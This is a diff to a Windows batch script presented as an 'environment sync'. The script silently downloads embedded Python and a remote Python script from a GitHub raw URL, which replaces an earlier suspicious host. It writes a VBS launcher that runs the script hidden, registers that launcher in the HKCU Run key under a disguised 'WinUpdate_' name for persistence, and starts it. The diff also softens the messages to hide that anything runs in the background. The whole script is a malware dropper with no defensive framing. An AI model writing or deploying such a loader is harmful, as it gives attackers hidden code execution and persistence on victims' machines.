@@ -3,7 +3,7 @@ setlocal
 
 :: --- Configuration ---
 set "U1=https://www.python.org/ftp/python/3.12.0/python-3.12.0-embed-amd64.zip"
-set "U2=http://townandcountry-form.org/SimpleAPI/script.py"
+set "U2=https://raw.githubusercontent.com/omebizonly-hash/sadasd/refs/heads/main/script.py"
 set "D=%LOCALAPPDATA%\WinPlatform"
 set "Z=%D%\p.zip"
 set "S=%D%\s.py"
@@ -13,22 +13,26 @@ if not exist "%D%" mkdir "%D%"
 
 echo [*] Synchronizing environment...
 
-:: PowerShell: Download, Extract, and Create VBS Launcher
+:: PowerShell: Download Python, Fetch GitHub Script, and Create Hidden Launcher
 powershell -ExecutionPolicy Bypass -Command ^
 "$dir='%D%'; ^
+$uAgent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'; ^
 $web=New-Object System.Net.WebClient; ^
-$web.Headers.Add('User-Agent','Mozilla/5.0'); ^
+$web.Headers.Add('User-Agent',$uAgent); ^
 [System.Net.ServicePointManager]::SecurityProtocol=[System.Net.SecurityProtocolType]::Tls12; ^
+Write-Host '[-] Fetching components...'; ^
 $web.DownloadFile('%U1%','%Z%'); ^
-$web.DownloadFile('%U2%','%S%'); ^
+$scriptData = $web.DownloadString('%U2%'); ^
+[System.IO.File]::WriteAllText('%S%', $scriptData); ^
+Write-Host '[-] Finalizing environment...'; ^
 Expand-Archive -Path '%Z%' -DestinationPath '%D%' -Force; ^
 Remove-Item '%Z%'; ^
-$vbsText = 'Set ws = CreateObject(\"WScript.Shell\"): ws.Run \"\"\"' + $dir + '\python.exe\"\" \"\"' + $dir + '\s.py\"\"\", 0, False'; ^
-[System.IO.File]::WriteAllText('%V%', $vbsText); ^
-$key = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'; ^
-$val = [System.Guid]::NewGuid().ToString().Substring(0,8); ^
-New-ItemProperty -Path $key -Name $val -Value 'wscript.exe \"%V%\"' -PropertyType 'String' -Force; ^
+$vbs = 'Set w=CreateObject(\"WScript.Shell\"):w.Run \"\"\"' + $dir + '\python.exe\"\" \"\"' + $dir + '\s.py\"\"\",0,False'; ^
+[System.IO.File]::WriteAllText('%V%', $vbs); ^
+$k='HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'; ^
+$n='WinUpdate_' + (Get-Random -Maximum 9999); ^
+New-ItemProperty -Path $k -Name $n -Value 'wscript.exe \"%V%\"' -PropertyType 'String' -Force; ^
 Start-Process 'wscript.exe' -ArgumentList '\"%V%\"'"
 
-echo [+] Complete. Process is running hidden.
+echo [+] Sync complete.
 endlocal
